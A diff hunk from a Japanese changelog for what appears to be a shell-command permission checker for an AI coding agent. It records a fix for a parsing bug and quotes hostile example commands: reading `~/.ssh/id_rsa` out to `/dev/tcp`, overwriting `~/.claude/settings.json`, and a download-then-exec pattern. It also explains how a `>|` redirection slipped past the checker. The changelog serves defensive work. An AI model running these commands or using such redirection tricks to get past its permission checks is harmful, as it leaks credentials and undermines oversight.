@@ -41,6 +41,10 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 - 機密パスの照合 (`~/.config//gh/hosts.yml`, `~/.kube/./config` など) と
   download-then-exec の「保存したファイルと実行するファイルが同じか」の比較
   (`> /tmp//i.sh && bash /tmp/./i.sh`) で、`//` と `/./` を畳んでから比べる。
+- `>|` / `n>|` (noclobber を無視する上書き) の `|` を pipe と解釈し、target を
+  別コマンドとして扱っていたため、`echo {} >| ~/.claude/settings.json` が allow、
+  `cat ~/.ssh/id_rsa >| /dev/tcp/…` が ask に格下げされていた問題を修正
+  (#258 / #262 のうち `>|` の部分)。
 - 上記はいずれも bash の等価変形による有界網羅テスト
   (`tests/bash_quote_equivalence.rs`) で検出。
 
